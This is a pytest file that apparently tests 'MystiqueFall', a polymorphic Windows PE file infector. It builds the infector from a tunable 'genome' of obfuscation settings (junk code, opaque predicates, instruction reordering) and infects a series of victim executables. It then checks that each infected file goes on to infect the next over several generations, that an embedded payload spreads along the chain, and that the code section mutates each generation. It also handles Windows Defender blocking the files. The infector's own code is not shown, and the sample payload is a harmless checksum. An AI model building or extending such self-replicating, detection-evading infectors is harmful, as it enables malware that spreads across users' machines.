"""MystiqueFall PE infection tests (pytest).

Tests bundle building, infection, multi-generation self-replication,
victim chain infection, and payload propagation.  Skips automatically
when required binary artifacts are missing.
"""
import hashlib
import json
import shutil
import struct
import subprocess
import sys
from pathlib import Path

import pytest

from tests.e2e.conftest import ROOT, BACKEND_DIR, LOADERS_DIR, BUNDLES_DIR, BACKEND_EXE, BACKEND_MCB

BACKEND_BIN = BACKEND_DIR / "backend_mystc.bin"
MYSTIQUEFALL_MCB = BUNDLES_DIR / "integrators" / "mystiqueFall" / "mystiquefall.mcb"
ENTRY_PE_MCB = BUNDLES_DIR / "integrators" / "mystiqueFall" / "integrator_entry_pe.mcb"
LOADER_EXE = LOADERS_DIR / "loader_win32.exe"
GENOME_JSON = BACKEND_DIR / "genome.json"
VICTIMS_DIR = ROOT / "tests" / "victims"
STRESS_VICTIM = VICTIMS_DIR / "stress_victim.exe"

REQUIRED_ARTIFACTS = [
    BACKEND_EXE, BACKEND_MCB, BACKEND_BIN,
    MYSTIQUEFALL_MCB, ENTRY_PE_MCB, LOADER_EXE, STRESS_VICTIM,
]

pytestmark = [
    pytest.mark.mystiquefall,
    pytest.mark.skipif(sys.platform != "win32", reason="MystiqueFall requires Windows"),
]


def _skip_if_missing():
    missing = [p.name for p in REQUIRED_ARTIFACTS if not p.exists()]
    if missing:
        pytest.skip(f"Missing artifacts: {', '.join(missing)}")


# ---------------------------------------------------------------------------
# Genome + bundle helpers
# ---------------------------------------------------------------------------

GENOME_HEADER_SIZE = 8
GENOME_GENE_COUNT = 65


def _build_genome(temperature=50):
    """Build binary genome from genome.json (or defaults)."""
    g = {}
    if GENOME_JSON.exists():
        with open(GENOME_JSON) as f:
            g = json.load(f)
    def val(k, d): return g.get(k, d)
    def vals(k, d): return g.get(k, d)
    buf = bytearray(b"GENE") + struct.pack("<H", 2) + bytes([temperature, 0])
    def w16(v): buf.extend(struct.pack("<h", int(v)))
    # IR genes
    w16(val("unfold_chance", 35))
    for w in vals("unfold_weights", [250]*4): w16(w)
    w16(val("substitute_chance", 40)); w16(val("dead_code_chance", 25))
    for w in vals("dead_code_weights", [250]*4): w16(w)
    w16(val("nop_chance", 20)); w16(val("nop_max_count", 3))
    # X86 poly genes
    for w in vals("add_weights", [200]*5): w16(w)
    for w in vals("sub_weights", [250]*4): w16(w)
    for w in vals("movi_weights", [166, 167, 167, 167, 167, 166]): w16(w)
    for w in vals("movi_zero_weights", [333, 333, 334]): w16(w)
    for w in vals("movi_neg1_weights", [333, 333, 334]): w16(w)
    for w in vals("xor_weights", [333, 333, 334]): w16(w)
    for w in vals("cmp_weights", [500, 500]): w16(w)
    for w in vals("junk_seq_weights", [125]*8): w16(w)
    # X86 transform genes
    w16(val("dead_prologue_pct", 30)); w16(val("dead_block_pct", 20))
    w16(val("dead_instr_pct", 10)); w16(val("opaque_pct", 5))
    for w in vals("opaque_weights", [333, 333, 334]): w16(w)
    w16(val("junk_call_block_pct", 8)); w16(val("junk_call_instr_pct", 3))
    w16(val("harmless_block_pct", 3)); w16(val("harmless_instr_pct", 1))
    w16(val("junk_func_pct", 50))
    # Gene expression
    w16(val("expression_flags", 32767)); w16(val("expression_rate", 50))
    # Reorder genes
    w16(val("reorder_instrs_intensity", 2)); w16(val("reorder_locals_chance", 100))
    w16(val("reorder_blocks_chance", 100)); w16(val("reorder_funcs_chance", 100))
    expected_size = GENOME_HEADER_SIZE + GENOME_GENE_COUNT * 2
    assert len(buf) == expected_size, f"Genome size {len(buf)} != expected {expected_size}"
    return bytes(buf)


def _build_mystiquefall_exe(tmp_path, payload_mcb=None):
    """Build gen0 infector as standalone PE with 4-blob auto-embed.

    Bundle architecture: entry_pe.mcb is compiled to standalone PE,
    with mystiquefall.mcb embedded as the engine blob.
    Layout: [entry_pe.mcb | mystiquefall.mcb | payload.mcb | genome]
    """
    exe = tmp_path / "mystiquefall.exe"
    cmd = [str(BACKEND_EXE), str(ENTRY_PE_MCB),
           "--pe-standalone", str(exe),
           "--engine", str(MYSTIQUEFALL_MCB),
           "--seed", "1001"]
    if payload_mcb:
        cmd += ["--payload", str(payload_mcb)]
    r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(ROOT))
    assert r.returncode == 0, f"Build mystiquefall.exe failed:\n{r.stderr}"
    assert exe.exists()
    return exe


def _get_text_hash(pe_data):
    """SHA256 of the .text section (first 16 hex chars)."""
    e_lfanew = struct.unpack_from("<I", pe_data, 0x3C)[0]
    num_sec = struct.unpack_from("<H", pe_data, e_lfanew + 6)[0]
    opt_sz = struct.unpack_from("<H", pe_data, e_lfanew + 20)[0]
    sec_start = e_lfanew + 24 + opt_sz
    for i in range(num_sec):
        off = sec_start + i * 40
        name = pe_data[off:off+8].rstrip(b'\x00')
        if name == b'.text':
            raw_ptr = struct.unpack_from("<I", pe_data, off + 20)[0]
            raw_sz = struct.unpack_from("<I", pe_data, off + 16)[0]
            return hashlib.sha256(pe_data[raw_ptr:raw_ptr+raw_sz]).hexdigest()[:16]
    return "no-.text"


# ---------------------------------------------------------------------------
# Infection helpers
# ---------------------------------------------------------------------------

def _infect(infector, victim_src, victim_dst, timeout=600):
    """Copy victim_src to victim_dst, infect it with infector. Return True on success."""
    shutil.copy2(victim_src, victim_dst)
    try:
        r = subprocess.run(
            [str(infector), "--infect", str(victim_dst)],
            capture_output=True, timeout=timeout,
        )
    except OSError as e:
        if getattr(e, 'winerror', 0) == 225:
            pytest.skip("Windows Defender blocked infected PE (WinError 225)")
        raise
    stdout = r.stdout.decode("utf-8", errors="replace")
    stderr = r.stderr.decode("utf-8", errors="replace")
    if "Infected:" in stdout:
        return True
    # Diagnostic dump on failure — pytest captures these and prints when the
    # assert fires.
    print(f"\n=== _infect FAILED ===")
    print(f"infector: {infector}")
    print(f"victim_dst: {victim_dst}")
    print(f"rc: {r.returncode}")
    print(f"stdout ({len(stdout)} chars):\n{stdout}")
    print(f"stderr ({len(stderr)} chars):\n{stderr}")
    print(f"=== end _infect ===\n")
    return False


def _run_and_check(exe, expected_output, expected_exit=0, timeout=30):
    """Run an exe and verify it produces the expected output."""
    try:
        r = subprocess.run([str(exe)], capture_output=True, timeout=timeout)
    except OSError as e:
        if getattr(e, 'winerror', 0) == 225:
            pytest.skip("Windows Defender blocked infected PE (WinError 225)")
        raise
    stdout = r.stdout.decode("utf-8", errors="replace")
    stderr = r.stderr.decode("utf-8", errors="replace")
    combined = stdout + stderr
    if r.returncode == expected_exit and expected_output in combined:
        return True
    # Diagnostic dump on failure.
    print(f"\n=== _run_and_check FAILED ===")
    print(f"exe: {exe}")
    print(f"expected_exit: {expected_exit}, got: {r.returncode}")
    print(f"expected_output: {expected_output!r}")
    print(f"in_combined: {expected_output in combined}")
    print(f"stdout ({len(stdout)} chars):\n{stdout}")
    print(f"stderr ({len(stderr)} chars):\n{stderr}")
    print(f"=== end _run_and_check ===\n")
    return False


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestBundleInfectsVictim:
    """Build mystiquefall.exe (standalone PE), infect stress_victim, verify it runs."""

    def test_infect_and_run(self, tmp_path):
        _skip_if_missing()
        driver = _build_mystiquefall_exe(tmp_path)

        victim = tmp_path / "victim.exe"
        assert _infect(driver, STRESS_VICTIM, victim), "Infection failed"
        assert _run_and_check(victim, "Total errors: 0"), "Victim failed after infection"


class TestThreeGenerationStress:
    """3-generation self-replication: gen1 infects gen2 infects gen3."""

    def test_three_gens(self, tmp_path):
        _skip_if_missing()
        driver = _build_mystiquefall_exe(tmp_path)

        gen1 = tmp_path / "gen1.exe"
        assert _infect(driver, STRESS_VICTIM, gen1), "Gen0->Gen1 infection failed"
        assert _run_and_check(gen1, "Total errors: 0"), "Gen1 failed to run"

        text_hashes = {_get_text_hash(gen1.read_bytes())}

        prev = gen1
        for i in range(2, 4):
            gen = tmp_path / f"gen{i}.exe"
            assert _infect(prev, STRESS_VICTIM, gen), f"Gen{i-1}->Gen{i} infection failed"
            assert _run_and_check(gen, "Total errors: 0"), f"Gen{i} failed to run"
            text_hashes.add(_get_text_hash(gen.read_bytes()))
            prev = gen

        assert len(text_hashes) >= 2, "Expected polymorphic .text across 3 generations"


VICTIM_CHAIN = [
    ("victim_sort",     "Total errors: 0"),
    ("victim_crypto",   "Total errors: 0"),
    ("victim_matrix",   "Total errors: 0"),
    ("victim_string",   "Total errors: 0"),
    ("victim_graph",    "Total errors: 0"),
    ("victim_compress", "Total errors: 0"),
    ("victim_math",     "Total errors: 0"),
    ("victim_tree",     "Total errors: 0"),
    ("victim_state",    "Total errors: 0"),
]


class TestVictimChain:
    """Chain infection across diverse victim PEs: each infected PE infects the next."""

    def test_chain(self, tmp_path):
        _skip_if_missing()
        driver = _build_mystiquefall_exe(tmp_path)

        # Infect first victim
        first_name, first_expect = VICTIM_CHAIN[0]
        first_src = VICTIMS_DIR / f"{first_name}.exe"
        if not first_src.exists():
            pytest.skip(f"{first_name}.exe not found")
        gen0 = tmp_path / f"{first_name}.exe"
        assert _infect(driver, first_src, gen0), f"Bundle -> {first_name} failed"
        assert _run_and_check(gen0, first_expect), f"{first_name} failed after infection"

        # Chain through remaining victims
        prev = gen0
        passed = 1
        for vname, vexpect in VICTIM_CHAIN[1:]:
            vsrc = VICTIMS_DIR / f"{vname}.exe"
            if not vsrc.exists():
                continue
            vdst = tmp_path / f"{vname}.exe"
            assert _infect(prev, vsrc, vdst), f"{prev.stem} -> {vname} infection failed"
            assert _run_and_check(vdst, vexpect), f"{vname} failed after infection"
            passed += 1
            prev = vdst

        assert passed >= 5, f"Only {passed} chain links succeeded (expected at least 5)"


PAYLOAD_MC = ROOT / "docs" / "examples" / "fibonacci_payload_win32.mc"
PAYLOAD_EXPECTED = "Checksum: 17710"


class TestPayloadChain:
    """Payload propagation: fibonacci payload embedded in bundle, chained through victims."""

    @staticmethod
    def _compile_payload(tmp_path):
        mcb = tmp_path / "payload.mcb"
        bin_ = tmp_path / "payload.bin"
        platform_def = "WIN32" if sys.platform == "win32" else "LINUX"
        r = subprocess.run(
            [sys.executable, "-m", "compiler.frontend.mystcc",
             str(PAYLOAD_MC), "-o", str(mcb), f"-D{platform_def}"],
            capture_output=True, timeout=60, cwd=str(ROOT),
        )
        assert r.returncode == 0, f"Payload frontend failed: {r.stderr}"
        r = subprocess.run(
            [str(BACKEND_EXE), str(mcb), "--pic", str(bin_)],
            capture_output=True, timeout=120,
        )
        assert r.returncode == 0 and bin_.exists(), f"Payload backend failed: {r.stderr}"
        return bin_.read_bytes(), mcb.read_bytes()

    def test_payload_through_three_victims(self, tmp_path):
        _skip_if_missing()
        if not PAYLOAD_MC.exists():
            pytest.skip("Payload source not found")

        payload_bin, payload_mcb = self._compile_payload(tmp_path)
        # Build with payload .mcb for auto-embed
        pay_mcb_path = tmp_path / "payload_embed.mcb"
        pay_mcb_path.write_bytes(payload_mcb)
        driver = _build_mystiquefall_exe(tmp_path, payload_mcb=pay_mcb_path)

        # Infect stress_victim with payload
        gen0 = tmp_path / "gen0.exe"
        assert _infect(driver, STRESS_VICTIM, gen0), "Payload bundle -> gen0 failed"
        assert _run_and_check(gen0, PAYLOAD_EXPECTED), "Gen0 missing payload output"
        assert _run_and_check(gen0, "Total errors: 0"), "Gen0 missing victim output"

        # Chain through 3 victims, verifying payload propagates
        prev = gen0
        victims_tested = 0
        for vname, vexpect in VICTIM_CHAIN[:3]:
            vsrc = VICTIMS_DIR / f"{vname}.exe"
            if not vsrc.exists():
                continue
            vdst = tmp_path / f"{vname}.exe"
            assert _infect(prev, vsrc, vdst), f"Payload: {prev.stem} -> {vname} failed"
            assert _run_and_check(vdst, PAYLOAD_EXPECTED), f"{vname} missing payload output"
            assert _run_and_check(vdst, vexpect), f"{vname} missing victim output"
            victims_tested += 1
            prev = vdst

        assert victims_tested >= 2, f"Only {victims_tested} payload chain links tested"
